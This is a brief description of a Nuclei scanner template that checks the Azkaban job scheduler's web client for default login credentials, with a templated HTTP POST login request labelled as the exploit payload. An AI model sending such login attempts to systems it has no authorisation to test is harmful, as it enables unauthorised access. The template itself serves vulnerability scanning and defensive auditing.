# Nuclei Template: Azkaban Web Client Default Credential
**Template ID:** azkaban-default-login
**Vulnerability Class:** Use of Hard-coded Credentials
**Severity:** High
**CWE:** CWE-798
**Source:** Nuclei Template (`azkaban-default-login.yaml`)

## Vulnerability Information & PoC

## Description
Azkaban is a batch workflow job scheduler created at LinkedIn to run Hadoop jobs.  Default web client credentials were discovered.

## Steps to reproduce / Exploit Payload
```http
POST / HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded; charset=UTF-8

action=login&username={{username}}&password={{password}}
```

